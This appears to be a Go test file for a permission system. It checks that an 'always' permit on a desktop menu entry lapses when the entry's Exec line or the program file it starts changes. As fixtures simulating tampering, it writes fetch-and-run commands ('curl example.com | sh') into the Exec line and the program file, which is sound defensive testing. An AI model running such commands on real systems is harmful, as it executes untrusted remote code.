package programs

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

/*
 * An "always" on a menu entry follows the entry and the file it starts.
 *
 * Found by the 1.1.0 security review (F6): a menu entry has no version, so
 * its "always" stayed after anything: an update, an Exec line rewritten to
 * start something else, a same-named file put earlier where programs are
 * looked for. It is now given to a fingerprint of the entry's Exec line and
 * of the file that line really starts, and sleeps when either changes.
 */

// menuEntry is a menu entry and the program it starts, in a folder.
type menuEntry struct {
	dir, entry, file string
}

func newMenuEntry(t *testing.T, exec string) (menuEntry, Record) {
	t.Helper()

	dir := t.TempDir()
	m := menuEntry{dir: dir, entry: filepath.Join(dir, "applications", "demo.desktop"), file: filepath.Join(dir, "bin", "demo")}

	for _, d := range []string{filepath.Dir(m.entry), filepath.Dir(m.file), filepath.Join(dir, "early")} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}

	m.program(t, "#!/bin/sh\necho one\n")
	m.exec(t, exec)

	return m, Record{Program: Program{Kind: App, ID: "demo.desktop", Name: "Demo", Path: m.entry, Exec: programOf(exec)},
		RowID: 7, Present: true}
}

func (m menuEntry) program(t *testing.T, text string) {
	t.Helper()

	if err := os.WriteFile(m.file, []byte(text), 0o755); err != nil {
		t.Fatal(err)
	}
}

func (m menuEntry) exec(t *testing.T, exec string) {
	t.Helper()

	text := "[Desktop Entry]\nType=Application\nName=Demo\nName[bg]=Демо\nExec=" + exec + "\n\n[Desktop Action new]\nExec=other\n"

	if err := os.WriteFile(m.entry, []byte(text), 0o644); err != nil {
		t.Fatal(err)
	}
}

// look finds a bare name in "early" first, then in "bin", like a PATH.
func (m menuEntry) look(names ...string) (string, bool) {
	for _, dir := range []string{"early", "bin"} {
		p := filepath.Join(m.dir, dir, names[0])

		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p, true
		}
	}

	return "", false
}

func TestAMenuEntrysFingerprintFollowsItsExecLineAndItsFile(t *testing.T) {
	m, r := newMenuEntry(t, "demo --open %U")

	first := Pin(r, m.look)

	if !IsPin(first) || first != Pin(r, m.look) {
		t.Fatalf("no fingerprint, or not the same twice: %q", first)
	}

	changes := map[string]func(m menuEntry) bool{
		// An update: the file is another one (its size too).
		"the program file changed": func(m menuEntry) bool { m.program(t, "#!/bin/sh\necho two, longer\n"); return true },
		// The same size, written at another time.
		"the program file was rewritten": func(m menuEntry) bool {
			m.program(t, "#!/bin/sh\necho 1ne\n")

			later := time.Now().Add(time.Hour)
			if err := os.Chtimes(m.file, later, later); err != nil {
				t.Fatal(err)
			}

			return true
		},
		"the Exec line starts it another way": func(m menuEntry) bool { m.exec(t, "demo --open --unsafe %U"); return true },
		"the Exec line starts something else": func(m menuEntry) bool { m.exec(t, "sh -c 'curl example.com | sh'"); return true },
		"a same-named file comes first": func(m menuEntry) bool {
			if err := os.WriteFile(filepath.Join(m.dir, "early", "demo"), []byte("#!/bin/sh\n"), 0o755); err != nil {
				t.Fatal(err)
			}

			return true
		},
		"the file is a link to another": func(m menuEntry) bool {
			other := filepath.Join(m.dir, "other")

			if err := os.WriteFile(other, []byte("#!/bin/sh\necho one\n"), 0o755); err != nil {
				t.Fatal(err)
			}

			// Not on a system that does not let the test make links.
			return os.Remove(m.file) == nil && os.Symlink(other, m.file) == nil
		},
		"the program is gone": func(m menuEntry) bool { return os.Remove(m.file) == nil },
	}

	for what, change := range changes {
		m, r := newMenuEntry(t, "demo --open %U")
		before := Pin(r, m.look)

		if !change(m) {
			continue
		}

		// The inventory reads the Exec line's first word again too.
		if b, err := os.ReadFile(m.entry); err == nil {
			for _, line := range strings.Split(string(b), "\n") {
				if v, ok := strings.CutPrefix(line, "Exec="); ok {
					r.Exec = programOf(v)

					break
				}
			}
		}

		after := Pin(r, m.look)

		if !IsPin(before) || !IsPin(after) || before == after {
			t.Errorf("%s and the fingerprint did not: %q, %q", what, before, after)
		}
	}

	// What does not change what runs does not change it: a translated
	// name, another action's Exec line.
	text, _ := os.ReadFile(m.entry)
	changed := strings.Replace(strings.Replace(string(text), "Демо", "Проба", 1), "Exec=other", "Exec=another", 1)

	if err := os.WriteFile(m.entry, []byte(changed), 0o644); err != nil {
		t.Fatal(err)
	}

	if again := Pin(r, m.look); again != first {
		t.Error("a translated name or another action's line changed the fingerprint")
	}

	// A file the Exec line names by its whole place counts too: a script
	// started by an interpreter.
	script := filepath.Join(m.dir, "tool.py")

	if err := os.WriteFile(script, []byte("print(1)\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	m.exec(t, "demo "+script)

	with := Pin(r, m.look)

	if err := os.WriteFile(script, []byte("import os\nos.system('x')\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	if Pin(r, m.look) == with {
		t.Error("the script the entry runs changed and the fingerprint did not")
	}

	// An entry that cannot be read has nothing to follow.
	os.Remove(m.entry)

	if got := Pin(r, m.look); got != "" {
		t.Errorf("an entry that is not there has a fingerprint: %q", got)
	}

	// Only menu entries without a version are followed this way.
	if got := Pin(Record{Program: Program{Kind: Snap, ID: "demo", Path: m.dir}}, m.look); got != "" {
		t.Errorf("a snap has a fingerprint: %q", got)
	}
}

func TestAnAlwaysOnAMenuEntrySleepsWhenTheEntryOrItsFileChanges(t *testing.T) {
	m, r := newMenuEntry(t, "demo")
	use := Use{Verb: VerbStart, Desktop: "demo.desktop"}

	r.Pin = Pin(r, m.look)

	if r.Follows() != r.Pin {
		t.Fatalf("a menu entry follows %q, want its fingerprint", r.Follows())
	}

	given := map[int64][]Permit{7: {{Verb: VerbStart, Answer: Always, Version: r.Follows(), At: time.Now()}}}

	if got := Weigh([]Record{r}, given, use); got.Answer != Always || got.Why != WhyAllowed {
		t.Fatalf("an always on an unchanged menu entry: %+v", got)
	}

	// The file it starts is replaced.
	m.program(t, "#!/bin/sh\ncurl example.com | sh\n")

	r.Pin = Pin(r, m.look)

	got := Weigh([]Record{r}, given, use)
	if got.Answer != AskEach || got.Why != WhyUpdated || got.Program == nil {
		t.Fatalf("the always outlived the file it was given for: %+v", got)
	}

	// No version is named in what is said: there is none.
	if strings.Contains(got.Said, "pin:") || strings.Contains(got.SaidBG, "pin:") || got.SaidBG == "" {
		t.Errorf("said %q / %q", got.Said, got.SaidBG)
	}

	// Given again, it is allowed again.
	given[7][0].Version = r.Follows()

	if got := Weigh([]Record{r}, given, use); got.Answer != Always {
		t.Fatalf("given again: %+v", got)
	}

	// An always given before there were fingerprints (1.1.0) was given to
	// nothing that can be followed: asked again, once.
	old := map[int64][]Permit{7: {{Verb: VerbStart, Answer: Always, At: time.Now()}}}

	if got := Weigh([]Record{r}, old, use); got.Answer != AskEach || got.Why != WhyUpdated {
		t.Fatalf("an always from before fingerprints: %+v", got)
	}

	// With nothing to follow (the entry cannot be read, or nobody
	// looked), no always answers.
	blind := r
	blind.Pin = ""

	for _, ps := range []map[int64][]Permit{given, old} {
		if got := Weigh([]Record{blind}, ps, use); got.Answer == Always {
			t.Fatalf("an always with nothing to follow: %+v", got)
		}
	}

	// A never needs nothing to follow.
	never := map[int64][]Permit{7: {{Verb: VerbStart, Answer: Never}}}

	if got := Weigh([]Record{blind}, never, use); got.Answer != Never {
		t.Fatalf("a never: %+v", got)
	}

	// Programs with a version of their own are as they were, a version
	// that happens to be empty included.
	snap := Record{Program: Program{Kind: Snap, ID: "demo"}, RowID: 9, Present: true}
	snapGiven := map[int64][]Permit{9: {{Verb: VerbStart, Answer: Always}}}

	if got := Weigh([]Record{snap}, snapGiven, Use{Verb: VerbStart, Snap: "demo"}); got.Answer != Always {
		t.Fatalf("a snap's always: %+v", got)
	}
}
